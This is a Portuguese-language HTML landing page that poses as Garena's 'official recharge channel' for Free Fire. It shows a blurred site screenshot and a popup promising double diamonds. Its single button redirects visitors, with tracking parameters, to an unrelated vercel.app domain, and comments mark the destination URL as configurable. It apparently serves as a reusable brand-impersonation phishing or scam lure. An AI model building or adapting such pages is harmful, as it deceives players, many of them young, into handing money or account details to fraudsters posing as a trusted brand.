<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Canal Oficial de Recarga - Garena</title>
  <meta name="description" content="Canal Oficial de Recarga Garena Free Fire" />
  <meta property="og:title" content="Canal Oficial de Recarga - Garena" />
  <meta property="og:description" content="Canal Oficial de Recarga Garena Free Fire" />
  <meta property="og:type" content="website" />
  <meta name="twitter:card" content="summary" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    html, body { height: 100%; }

    body {
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
      background: #1a1a1a;
      overflow: hidden;
    }

    /* ===== Fundo: screenshot do site ===== */
    .bg {
      position: fixed;
      inset: 0;
      z-index: 1;
      background-color: #1a1a1a;
      background-image: url("bg.png");
      background-size: cover;
      background-position: top;
      background-repeat: no-repeat;
      filter: blur(10px) brightness(0.7);
    }

    /* ===== Overlay escuro ===== */
    .overlay {
      position: fixed;
      inset: 0;
      z-index: 2;
      background: rgba(0, 0, 0, 0.55);
    }

    /* ===== Popup da Promoção ===== */
    .popup-wrap {
      position: fixed;
      inset: 0;
      z-index: 10;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .popup {
      width: 100%;
      max-width: 400px;
      overflow: hidden;
      border-radius: 16px;
      border: 1px solid rgba(59, 130, 246, 0.4);
      background: #0b1220;
      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6), 0 0 40px rgba(59, 130, 246, 0.25);
      animation: popupIn 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
    }

    @keyframes popupIn {
      from { opacity: 0; transform: scale(0.85) translateY(20px); }
      to { opacity: 1; transform: scale(1) translateY(0); }
    }

    .popup img {
      display: block;
      width: 100%;
    }

    .popup-content { padding: 20px 24px 24px; }

    .btn-recarregar {
      display: flex;
      width: 100%;
      align-items: center;
      justify-content: center;
      gap: 8px;
      padding: 16px 24px;
      border-radius: 12px;
      background: linear-gradient(to bottom, #ff9c1a, #f57c00);
      color: #ffffff;
      font-size: 16px;
      font-weight: 800;
      text-transform: uppercase;
      letter-spacing: 0.03em;
      text-decoration: none;
      box-shadow: 0 6px 18px rgba(245, 124, 0, 0.45);
      transition: all 0.2s ease;
      cursor: pointer;
      border: none;
    }

    .btn-recarregar:hover {
      background: linear-gradient(to bottom, #ffab3d, #ff8f00);
      box-shadow: 0 8px 24px rgba(245, 124, 0, 0.6);
    }

    .btn-recarregar:active { transform: translateY(1px); }

    .btn-recarregar svg { width: 20px; height: 20px; flex-shrink: 0; }

    .popup-content p {
      margin-top: 12px;
      text-align: center;
      font-size: 11.5px;
      line-height: 1.5;
      color: #8fa3c0;
    }

    @media (max-width: 480px) {
      .popup-content { padding: 20px 20px; }
      .btn-recarregar { padding: 14px 24px; font-size: 15px; }
    }
  </style>
</head>
<body>
  <!-- Fundo: screenshot do site -->
  <div class="bg"></div>

  <!-- Overlay escuro -->
  <div class="overlay"></div>

  <!-- Popup da Promoção -->
  <div class="popup-wrap">
    <div class="popup">
      <!-- Banner da promoção -->
      <img
        src="bonus_ff.png"
        alt="Promoção: Recarregue pelo ID e ganhe 2x de diamantes nas recargas a partir de 2.180 diamantes"
      />

      <div class="popup-content">
        <!-- ====== CONFIGURE SUA URL DE DESTINO AQUI (no script abaixo) ====== -->
        <a href="#" class="btn-recarregar" onclick="redirecionar(event); return false;">
          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M13 2L4.5 13.5H11L9.5 22L19.5 9.5H12.5L13 2Z" fill="currentColor" />
          </svg>
          Recarregar agora
        </a>

        <p>Recarga oficial pelo ID — ganhe o dobro de diamantes</p>
      </div>
    </div>
  </div>

  <script>
    // ====== CONFIGURE SUA URL DE DESTINO AQUI ======
    var URL_DESTINO = "https://jogo-recarga.vercel.app/";
    // ================================================

    function getUrlDestinoComUtms() {
      var paramsAtuais = window.location.search;
      if (paramsAtuais) {
        var separador = URL_DESTINO.indexOf("?") !== -1 ? "&" : "?";
        return URL_DESTINO + separador + paramsAtuais.substring(1);
      }
      return URL_DESTINO;
    }

    function redirecionar(e) {
      if (e) e.preventDefault();
      window.location.replace(getUrlDestinoComUtms());
    }
  </script>
</body>
</html>
